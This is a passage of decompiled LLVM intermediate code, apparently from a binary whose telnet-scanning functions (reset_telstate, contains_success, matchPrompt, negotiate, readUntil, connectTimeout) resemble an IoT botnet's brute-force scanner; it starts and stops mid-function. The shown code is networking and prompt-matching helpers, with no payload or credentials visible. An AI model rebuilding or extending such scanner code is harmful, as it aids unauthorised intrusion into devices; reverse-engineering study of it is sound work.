  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80492b8, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_80492cd = icmp eq i32 %arg2, 0
  %v6_80492cd = trunc i32 %arg2 to i8
  %v1_80492d1 = icmp eq i1 %v4_80492cd, false
  br i1 %v1_80492d1, label %dec_label_pc_80492e0, label %dec_label_pc_80492d3

dec_label_pc_80492d3:                             ; preds = %entry
  %v2_80492d6 = load i32, i32* %arg1, align 4
  %v1_80492db = call i32 @__libc_close(i32 %v2_80492d6)
  br label %dec_label_pc_80492e0

dec_label_pc_80492e0:                             ; preds = %entry, %dec_label_pc_80492d3
  %v1_80492e3 = add i32 %tmp3, 16
  %v2_80492e3 = inttoptr i32 %v1_80492e3 to i32*
  store i32 0, i32* %v2_80492e3, align 4
  %v3_80492f2 = add i32 %tmp3, 8
  %v4_80492f2 = inttoptr i32 %v3_80492f2 to i8*
  store i8 %v6_80492cd, i8* %v4_80492f2, align 1
  %v1_80492f8 = add i32 %tmp3, 24
  %v2_80492f8 = inttoptr i32 %v1_80492f8 to i32*
  %v3_80492f8 = load i32, i32* %v2_80492f8, align 4
  %v3_8049311 = inttoptr i32 %v3_80492f8 to i8*
  %v4_8049311 = call i32 @__GI_memset(i8* %v3_8049311, i32 0, i32 1024)
  ret i32 %v4_8049311

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80492e0, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049318 = load i32, i32* @ebp, align 4
  store i32 %v0_8049318, i32* %stack_var_-4, align 4
  %v2_804932c = inttoptr i32 %arg1 to i32*
  %v3_804932c = call i32 @advance_state(i32* %v2_804932c, i32 0)
  %v1_8049334 = add i32 %arg1, 9
  %v2_8049334 = inttoptr i32 %v1_8049334 to i8*
  store i8 1, i8* %v2_8049334, align 1
  %v2_8049338 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049338, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804933a = load i32, i32* @ebp, align 4
  store i32 %v0_804933a, i32* %stack_var_-4, align 4
  %v4_804933a = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804933a, i32* @ebp, align 4
  %v4_804934e = call i32 @contains_string(i32 %arg1, i32* bitcast ([3 x i8*]* @global_var_8059d80.23 to i32*))
  %v2_8049353 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049353, i32* @ebp, align 4
  ret i32 %v4_804934e

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049355 = load i32, i32* @ebp, align 4
  store i32 %v0_8049355, i32* %stack_var_-4, align 4
  %v4_8049355 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049355, i32* @ebp, align 4
  %v4_8049369 = call i32 @contains_string(i32 %arg1, i32* bitcast ([7 x i8*]* @global_var_8059d60.31 to i32*))
  %v2_804936e = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804936e, i32* @ebp, align 4
  ret i32 %v4_8049369

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049370 = load i32, i32* @ebp, align 4
  store i32 %v0_8049370, i32* %stack_var_-4, align 4
  %v4_8049370 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8049370, i32* @ebp, align 4
  %v1_804937c = call i32 @contains_success(i32 %arg1)
  %v1_8049381 = icmp eq i32 %v1_804937c, 0
  %v1_8049383 = icmp eq i1 %v1_8049381, false
  br i1 %v1_8049383, label %dec_label_pc_80493a4, label %dec_label_pc_8049385

dec_label_pc_8049385:                             ; preds = %entry
  %v1_804938b = call i32 @contains_fail(i32 %arg1)
  %v1_8049390 = icmp ne i32 %v1_804938b, 0
  %. = zext i1 %v1_8049390 to i32
  br label %dec_label_pc_80493a4

dec_label_pc_80493a4:                             ; preds = %dec_label_pc_8049385, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_8049385 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_80493a9 = load i32, i32* @ebp, align 4
  store i32 %v0_80493a9, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80493c4

dec_label_pc_80493c4:                             ; preds = %dec_label_pc_80493c4, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_80493c4, %dec_label_pc_80493c4 ]
  %v4_80493c4 = add i32 %stack_var_-12.0, 1
  %v2_80493ca = mul i32 %v4_80493c4, 4
  %v5_80493cd = add i32 %v2_80493ca, %tmp5
  %v1_80493d0 = inttoptr i32 %v5_80493cd to i32*
  %v2_80493d0 = load i32, i32* %v1_80493d0, align 4
  %v1_80493d2 = icmp eq i32 %v2_80493d0, 0
  %v1_80493d4 = icmp eq i1 %v1_80493d2, false
  br i1 %v1_80493d4, label %dec_label_pc_80493c4, label %dec_label_pc_8049409.preheader

dec_label_pc_8049409.preheader:                   ; preds = %dec_label_pc_80493c4
  %v2_80493f4 = inttoptr i32 %arg1 to i8*
  %v5_804940f17 = icmp sgt i32 %v4_80493c4, 0
  br i1 %v5_804940f17, label %dec_label_pc_80493df, label %dec_label_pc_8049418

dec_label_pc_80493df:                             ; preds = %dec_label_pc_8049409.preheader, %dec_label_pc_8049406
  %storemerge118 = phi i32 [ %v4_8049406, %dec_label_pc_8049406 ], [ 0, %dec_label_pc_8049409.preheader ]
  %v2_80493e2 = mul i32 %storemerge118, 4
  %v5_80493e5 = add i32 %v2_80493e2, %tmp5
  %v1_80493e8 = inttoptr i32 %v5_80493e5 to i32*
  %v2_80493e8 = load i32, i32* %v1_80493e8, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_80493f4 = call i32 @strcasestr(i8* %v2_80493f4, i32 %v2_80493e8)
  %v1_80493f9 = icmp eq i32 %v3_80493f4, 0
  br i1 %v1_80493f9, label %dec_label_pc_8049406, label %dec_label_pc_8049418

dec_label_pc_8049406:                             ; preds = %dec_label_pc_80493df
  %v4_8049406 = add nuw nsw i32 %storemerge118, 1
  %v5_804940f = icmp slt i32 %v4_8049406, %v4_80493c4
  br i1 %v5_804940f, label %dec_label_pc_80493df, label %dec_label_pc_8049418

dec_label_pc_8049418:                             ; preds = %dec_label_pc_80493df, %dec_label_pc_8049406, %dec_label_pc_8049409.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_8049409.preheader ], [ 0, %dec_label_pc_8049406 ], [ 1, %dec_label_pc_80493df ]
  %v2_804941b = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804941b, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049406, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_80493c4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8049418, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80493df, { 1, 0 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049420 = load i32, i32* @edi, align 4
  store i32 %v0_8049420, i32* %stack_var_-8, align 4
  %v3_804943d = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049445 = or i32 %v3_804943d, 2048
  %v3_8049461 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049445)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_8049475 = trunc i32 %arg3 to i16
  %v2_8049475 = call i32 @htons(i16 %v1_8049475)
  store i32 %arg2, i32* @edx, align 4
  %v3_8049491 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_8049496 = icmp eq i32 %v3_8049491, 0
  br i1 %v1_8049496, label %dec_label_pc_80494a9, label %dec_label_pc_8049619

dec_label_pc_80494a9:                             ; preds = %entry
  %v2_8049484 = ptrtoint i32* %stack_var_-40 to i32
  %v3_80494d1 = call i32 @__libc_connect(i32 %arg1, i32 %v2_8049484, i32 16)
  %v5_80494d9 = icmp slt i32 %v3_80494d1, 0
  %v1_80494dd = icmp eq i1 %v5_80494d9, false
  br i1 %v1_80494dd, label %dec_label_pc_80495d0, label %dec_label_pc_80494e3

dec_label_pc_80494e3:                             ; preds = %dec_label_pc_80494a9
  %v1_80494e3 = call i32 @__errno_location(i32 %v3_80494d1)
  %v1_80494e8 = inttoptr i32 %v1_80494e3 to i32*
  %v2_80494e8 = load i32, i32* %v1_80494e8, align 4
  %v9_80494ea = icmp eq i32 %v2_80494e8, 115
  %v1_80494ed = icmp eq i1 %v9_80494ea, false
  br i1 %v1_80494ed, label %dec_label_pc_8049619, label %dec_label_pc_80494f3

dec_label_pc_80494f3:                             ; preds = %dec_label_pc_80494e3
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_8049510 = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8049510, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049517 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_8049524 = udiv i32 %arg1, 32
  %v1_804952a = urem i32 %arg1, 32
  %v0_804952d = load i32, i32* @ebp, align 4
  %v2_804952d = mul nuw nsw i32 %v2_8049524, 4
  %v3_804952d = add nsw i32 %v2_804952d, -164
  %v4_804952d = add i32 %v3_804952d, %v0_804952d
  %v5_804952d = inttoptr i32 %v4_804952d to i32*
  %v6_804952d = load i32, i32* %v5_804952d, align 4
  %v9_804952d = shl i32 1, %v1_804952a
  %v12_804952d = or i32 %v6_804952d, %v9_804952d
  store i32 %v12_804952d, i32* %v5_804952d, align 4
  %v1_8049538 = add i32 %arg1, 1
  %v2_8049539 = ptrtoint i32* %stack_var_-176 to i32
  %v5_8049560 = call i32 @__libc_select(i32 %v1_8049538, i32 0, i32 %v2_8049510, i32 0, i32 %v2_8049539)
  %tmp28 = icmp slt i32 %v5_8049560, 1
  br i1 %tmp28, label %dec_label_pc_8049619, label %dec_label_pc_8049569

dec_label_pc_8049569:                             ; preds = %dec_label_pc_80494f3
  store i32 4, i32* %stack_var_-180, align 4
  %v2_8049573 = ptrtoint i32* %stack_var_-180 to i32
  %v2_804957d = ptrtoint i32* %stack_var_-184 to i32
  %v5_804959d = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_804957d, i32 %v2_8049573)
  %v3_80495a2 = load i32, i32* %stack_var_-184, align 4
  %v1_80495a8 = icmp eq i32 %v3_80495a2, 0
  br i1 %v1_80495a8, label %dec_label_pc_80495d0, label %dec_label_pc_8049619

dec_label_pc_80495d0:                             ; preds = %dec_label_pc_8049569, %dec_label_pc_80494a9
  %v3_80495e6 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80495ee = and i32 %v3_80495e6, -2049
  %v3_804960a = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80495ee)
  br label %dec_label_pc_8049619

dec_label_pc_8049619:                             ; preds = %dec_label_pc_80494e3, %dec_label_pc_80494f3, %dec_label_pc_8049569, %entry, %dec_label_pc_80495d0
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_80495d0 ], [ 0, %entry ], [ 0, %dec_label_pc_8049569 ], [ 0, %dec_label_pc_80494f3 ], [ 0, %dec_label_pc_80494e3 ]
  %v2_8049625 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049625, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049619, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804962b = load i32, i32* @ebx, align 4
  store i32 %v0_804962b, i32* %stack_var_-8, align 4
  %v1_804962f = call i32 @__libc_fork(i32 %v0_804962b)
  %v4_8049637 = icmp eq i32 %v1_804962f, 0
  %v1_804963b = icmp eq i1 %v4_8049637, false
  br i1 %v1_804963b, label %dec_label_pc_8049648, label %dec_label_pc_804963d

dec_label_pc_804963d:                             ; preds = %entry
  br label %dec_label_pc_8049724

dec_label_pc_8049648:                             ; preds = %entry
  %v0_8049648 = load i32, i32* @global_var_805a088.32, align 8
  %v0_804964d = load i32, i32* @global_var_805a08c.33, align 4
  %v1_8049653 = add i32 %v0_8049648, 1
  %v5_8049653 = icmp eq i32 %v0_8049648, -1
  %v2_8049656 = zext i1 %v5_8049653 to i32
  %v3_8049656 = add i32 %v2_8049656, %v0_804964d
  store i32 %v1_8049653, i32* @global_var_805a088.32, align 8
  store i32 %v3_8049656, i32* @global_var_805a08c.33, align 4
  %v2_8049673 = mul i32 %v1_8049653, 4
  %v1_8049676 = add i32 %v2_8049673, 4
  %v1_804967c = call i32 @malloc(i32 %v1_8049676)
  br label %dec_label_pc_80496af

dec_label_pc_804968d:                             ; preds = %dec_label_pc_80496af, %dec_label_pc_80496e0
  %v2_8049690 = mul i32 %storemerge1, 4
  %v5_8049695 = add i32 %v2_8049690, %v1_804967c
  %v0_80496a0 = load i32, i32* @global_var_8060314.34, align 4
  %v2_80496a5 = add i32 %v0_80496a0, %v2_8049690
  %v1_80496a8 = inttoptr i32 %v2_80496a5 to i32*
  %v2_80496a8 = load i32, i32* %v1_80496a8, align 4
  %v2_80496aa = inttoptr i32 %v5_8049695 to i32*
  store i32 %v2_80496a8, i32* %v2_80496aa, align 4
  %v4_80496ac = add i32 %storemerge1, 1
  br label %dec_label_pc_80496af

dec_label_pc_80496af:                             ; preds = %dec_label_pc_8049648, %dec_label_pc_804968d
  %storemerge1 = phi i32 [ %v4_80496ac, %dec_label_pc_804968d ], [ 0, %dec_label_pc_8049648 ]
  %v0_80496bd = load i32, i32* @global_var_805a088.32, align 8
  %v0_80496c2 = load i32, i32* @global_var_805a08c.33, align 4
  %v4_80496cc = icmp ne i32 %v0_80496bd, 0
  %v2_80496cf = zext i1 %v4_80496cc to i32
  %v3_80496cf = add i32 %v0_80496c2, -1
  %v4_80496cf = add i32 %v3_80496cf, %v2_80496cf
  store i32 %v4_80496cf, i32* @ebx, align 4
  %v10_80496db = icmp eq i32 %v4_80496cf, 0
  br i1 %v10_80496db, label %dec_label_pc_80496e0, label %dec_label_pc_804968d

dec_label_pc_80496e0:                             ; preds = %dec_label_pc_80496af
  %v1_80496cc = add i32 %v0_80496bd, -1
  %v10_80496eb = icmp ult i32 %storemerge1, %v1_80496cc
  br i1 %v10_80496eb, label %dec_label_pc_804968d, label %dec_label_pc_80496f0

dec_label_pc_80496f0:                             ; preds = %dec_label_pc_80496e0
  %v2_80496fb = mul i32 %v0_80496bd, 4
  %v5_80496fe = add i32 %v2_80496fb, %v1_804967c
  %v1_8049701 = add i32 %v5_80496fe, -4
  store i32 %v1_8049701, i32* @edx, align 4
  %v2_8049707 = inttoptr i32 %v1_8049701 to i32*
  store i32 %v1_804962f, i32* %v2_8049707, align 4
  %v0_8049709 = load i32, i32* @global_var_8060314.34, align 4
  %v1_8049711 = call i32 @free(i32 %v0_8049709)
  store i32 %v1_804967c, i32* @global_var_8060314.34, align 4
  store i32 %v1_804962f, i32* @ecx, align 4
  br label %dec_label_pc_8049724

dec_label_pc_8049724:                             ; preds = %dec_label_pc_804963d, %dec_label_pc_80496f0
  %v2_804972a = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804972a, i32* @ebx, align 4
  ret i32 %v1_804962f

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_8049690, { 1, 0 }
  uselistorder i32 %v1_804967c, { 2, 0, 1 }
  uselistorder i32 %v0_8049648, { 1, 0 }
  uselistorder label %dec_label_pc_8049724, { 1, 0 }
  uselistorder label %dec_label_pc_80496af, { 1, 0 }
  uselistorder label %dec_label_pc_804968d, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_804972d = load i32, i32* @ebp, align 4
  store i32 %v0_804972d, i32* %stack_var_-4, align 4
  %v1_8049736 = add i32 %arg2, 1
  %v1_8049737 = inttoptr i32 %v1_8049736 to i8*
  %v2_8049737 = load i8, i8* %v1_8049737, align 1
  %v9_8049740 = icmp ult i8 %v2_8049737, -5
  br i1 %v9_8049740, label %dec_label_pc_804984b, label %dec_label_pc_804974d

dec_label_pc_804974d:                             ; preds = %entry
  %v7_8049754 = icmp eq i8 %v2_8049737, -1
  br i1 %v7_8049754, label %dec_label_pc_8049756, label %dec_label_pc_8049770

dec_label_pc_8049756:                             ; preds = %dec_label_pc_804974d
  br label %dec_label_pc_804984b

dec_label_pc_8049770:                             ; preds = %dec_label_pc_804974d
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_8049784 = ptrtoint i8* %stack_var_-5 to i32
  %v4_8049791 = call i32 @__libc_send(i32 %arg1, i32 %v2_8049784, i32 1, i32 16384)
  %v2_804979a = load i8, i8* %v1_8049737, align 1
  %v11_804979d = icmp eq i8 %v2_804979a, -4
  %v1_804979f = icmp eq i1 %v11_804979d, false
  br i1 %v1_804979f, label %dec_label_pc_80497a7, label %dec_label_pc_80497a1

dec_label_pc_80497a1:                             ; preds = %dec_label_pc_8049770
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497a7:                             ; preds = %dec_label_pc_8049770
  %v2_80497ab = load i8, i8* %v1_8049737, align 1
  %v11_80497ae = icmp eq i8 %v2_80497ab, -2
  %v1_80497b0 = icmp eq i1 %v11_80497ae, false
  br i1 %v1_80497b0, label %dec_label_pc_80497b8, label %dec_label_pc_80497b2

dec_label_pc_80497b2:                             ; preds = %dec_label_pc_80497a7
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497b8:                             ; preds = %dec_label_pc_80497a7
  %v2_80497bc = load i8, i8* %v1_8049737, align 1
  %v10_80497bf = icmp eq i8 %v2_80497bc, 3
  %v1_80497c1 = icmp eq i1 %v10_80497bf, false
  %v11_80497e8 = icmp eq i8 %v2_80497bc, -3
  %v1_80497ea = icmp eq i1 %v11_80497e8, false
  br i1 %v1_80497c1, label %dec_label_pc_80497e1, label %dec_label_pc_80497c3

dec_label_pc_80497c3:                             ; preds = %dec_label_pc_80497b8
  %. = select i1 %v1_80497ea, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497e1:                             ; preds = %dec_label_pc_80497b8
  %.3 = select i1 %v1_80497ea, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_80497fd

dec_label_pc_80497fd:                             ; preds = %dec_label_pc_80497c3, %dec_label_pc_80497b2, %dec_label_pc_80497a1, %dec_label_pc_80497e1
  %v4_804981a = call i32 @__libc_send(i32 %arg1, i32 %v2_8049784, i32 1, i32 16384)
  %v1_8049822 = add i32 %arg2, 2
  %v4_804983f = call i32 @__libc_send(i32 %arg1, i32 %v1_8049822, i32 1, i32 16384)
  %v2_804984e.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804984b

dec_label_pc_804984b:                             ; preds = %dec_label_pc_8049756, %dec_label_pc_80497fd, %entry
  %v2_804984e = phi i32 [ %v0_804972d, %dec_label_pc_8049756 ], [ %v2_804984e.pre, %dec_label_pc_80497fd ], [ %v0_804972d, %entry ]
  store i32 %v2_804984e, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804984b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80497fd, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_804985e = ptrtoint i8* %arg1 to i32
  %v3_804986f = call i32 @_strlen(i8* %arg1)
  %v4_804986f = mul i32 %v3_804986f, -1
  %v1_8049875 = sub i32 0, %v4_804986f
  %v6_804989c = sub i32 %v4_804985e, %v4_804986f
  br label %dec_label_pc_8049924

dec_label_pc_804988c:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_80498c7, %dec_label_pc_80498af, %dec_label_pc_8049897
  %v4_804988c = add nsw i32 %stack_var_-12.033, 1
  %v7_8049895 = icmp slt i32 %v4_804988c, %v1_8049875
  br i1 %v7_8049895, label %dec_label_pc_8049897, label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge

dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge: ; preds = %dec_label_pc_804988c, %dec_label_pc_804988f.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_804988f.preheader ], [ %v4_804988c, %dec_label_pc_804988c ]
  %.pre = sub i32 %v6_804989c, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_80498f7

dec_label_pc_8049897:                             ; preds = %dec_label_pc_804988f.preheader, %dec_label_pc_804988c
  %stack_var_-12.033 = phi i32 [ %v4_804988c, %dec_label_pc_804988c ], [ %stack_var_-12.1, %dec_label_pc_804988f.preheader ]
  %v2_80498a4 = sub i32 %v6_804989c, %stack_var_-12.033
  %v1_80498a8 = inttoptr i32 %v2_80498a4 to i8*
  %v2_80498a8 = load i8, i8* %v1_80498a8, align 1
  %v4_80498ab = icmp eq i8 %v2_80498a8, 0
  br i1 %v4_80498ab, label %dec_label_pc_804988c, label %dec_label_pc_80498af

dec_label_pc_80498af:                             ; preds = %dec_label_pc_8049897
  %v2_80498c0 = load i8, i8* %v1_80498a8, align 1
  %v7_80498c3 = icmp eq i8 %v2_80498c0, 32
  br i1 %v7_80498c3, label %dec_label_pc_804988c, label %dec_label_pc_80498c7

dec_label_pc_80498c7:                             ; preds = %dec_label_pc_80498af
  %v2_80498d8 = load i8, i8* %v1_80498a8, align 1
  %v10_80498db = icmp eq i8 %v2_80498d8, 13
  br i1 %v10_80498db, label %dec_label_pc_804988c, label %dec_label_pc_80498df

dec_label_pc_80498df:                             ; preds = %dec_label_pc_80498c7
  %v2_80498f0 = load i8, i8* %v1_80498a8, align 1
  %v10_80498f3 = icmp eq i8 %v2_80498f0, 10
  br i1 %v10_80498f3, label %dec_label_pc_804988c, label %dec_label_pc_80498f7

dec_label_pc_80498f7:                             ; preds = %dec_label_pc_80498df, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge
  %stack_var_-12.023 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge ], [ %stack_var_-12.033, %dec_label_pc_80498df ]
  %v1_8049908.pre-phi = phi i8* [ %.pre10, %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge ], [ %v1_80498a8, %dec_label_pc_80498df ]
  %v2_8049908 = load i8, i8* %v1_8049908.pre-phi, align 1
  %v6_804990e = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_8056725.35 to i32)
  %v1_8049911 = inttoptr i32 %v6_804990e to i8*
  %v2_8049911 = load i8, i8* %v1_8049911, align 1
  %v15_8049914 = icmp eq i8 %v2_8049908, %v2_8049911
  %v1_8049916 = icmp eq i1 %v15_8049914, false
  br i1 %v1_8049916, label %dec_label_pc_8049921, label %dec_label_pc_804994e

dec_label_pc_8049921:                             ; preds = %dec_label_pc_80498f7
  %v4_8049921 = add i32 %storemerge3, 1
  br label %dec_label_pc_8049924

dec_label_pc_8049924:                             ; preds = %entry, %dec_label_pc_8049921
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.023, %dec_label_pc_8049921 ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_8049921, %dec_label_pc_8049921 ]
  %v3_8049938 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056725.35, i32 0, i32 0))
  %v7_804993f = icmp ult i32 %storemerge3, %v3_8049938
  br i1 %v7_804993f, label %dec_label_pc_804988f.preheader, label %dec_label_pc_804994e

dec_label_pc_804988f.preheader:                   ; preds = %dec_label_pc_8049924
  %v7_804989532 = icmp slt i32 %stack_var_-12.1, %v1_8049875
  br i1 %v7_804989532, label %dec_label_pc_8049897, label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge

dec_label_pc_804994e:                             ; preds = %dec_label_pc_8049924, %dec_label_pc_80498f7
  %storemerge = phi i32 [ 1, %dec_label_pc_80498f7 ], [ 0, %dec_label_pc_8049924 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_804989c, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8056725.35, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049924, { 1, 0 }
  uselistorder label %dec_label_pc_804988f.dec_label_pc_80498f7_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_804999d = ptrtoint i32* %stack_var_-160 to i32
  %tmp27 = bitcast i32* %stack_var_-160 to i8*
  %v1_80499b7 = urem i32 %arg1, 32
  %v9_80499ba = shl i32 1, %v1_80499b7
  %v1_80499c5 = add i32 %arg1, 1
  %v2_80499c6 = ptrtoint i32* %stack_var_-168 to i32
  %v5_80499fd = ptrtoint i8* %arg6 to i32
  %v2_8049ad1 = inttoptr i32 %arg2 to i8*
  %v4_8049ada = icmp eq i32 %arg3, 0
  %v1_8049afb34 = add i32 %arg8, 2
  %v5_8049b0143 = icmp slt i32 %v1_8049afb34, %arg7
  br i1 %v5_8049b0143, label %dec_label_pc_8049b03.lr.ph, label %dec_label_pc_8049b1f

dec_label_pc_8049b03.lr.ph:                       ; preds = %entry
  %v2_80499b1 = udiv i32 %arg1, 32
  %v2_80499ba = mul nuw nsw i32 %v2_80499b1, 4
  %v3_80499ba = add nsw i32 %v2_80499ba, -156
  %tmp31 = icmp slt i32 %arg5, 1
  %tmp32 = icmp eq i1 %tmp31, false
  br label %dec_label_pc_8049b03

dec_label_pc_8049993:                             ; preds = %dec_label_pc_8049b11, %dec_label_pc_8049b03
  store i32 %v2_804999d, i32* @edi, align 4
  %v5_80499a4 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_80499ba = load i32, i32* @ebp, align 4
  %v4_80499ba = add i32 %v3_80499ba, %v0_80499ba
  %v5_80499ba = inttoptr i32 %v4_80499ba to i32*
  %v6_80499ba = load i32, i32* %v5_80499ba, align 4
  %v12_80499ba = or i32 %v6_80499ba, %v9_80499ba
  store i32 %v12_80499ba, i32* %v5_80499ba, align 4
  %v5_80499ed = call i32 @__libc_select(i32 %v1_80499c5, i32 %v2_804999d, i32 0, i32 0, i32 %v2_80499c6)
  %tmp28 = icmp slt i32 %v5_80499ed, 1
  br i1 %tmp28, label %dec_label_pc_8049b1f, label %dec_label_pc_80499fa

dec_label_pc_80499fa:                             ; preds = %dec_label_pc_8049993
  %v6_80499fd = add i32 %stack_var_-32.044, %v5_80499fd
  %v5_8049a00 = inttoptr i32 %v6_80499fd to i8*
  %v4_8049a20 = call i32 @__libc_recv(i32 %arg1, i32 %v6_80499fd, i32 1, i32 0)
  %v13_8049a28 = icmp eq i32 %v4_8049a20, -1
  br i1 %v13_8049a28, label %dec_label_pc_8049b3b, label %dec_label_pc_8049a2e

dec_label_pc_8049a2e:                             ; preds = %dec_label_pc_80499fa
  %v4_8049a2e = icmp eq i32 %v4_8049a20, 0
  %v1_8049a32 = icmp eq i1 %v4_8049a2e, false
  br i1 %v1_8049a32, label %dec_label_pc_8049a43, label %dec_label_pc_8049b3b

dec_label_pc_8049a43:                             ; preds = %dec_label_pc_8049a2e
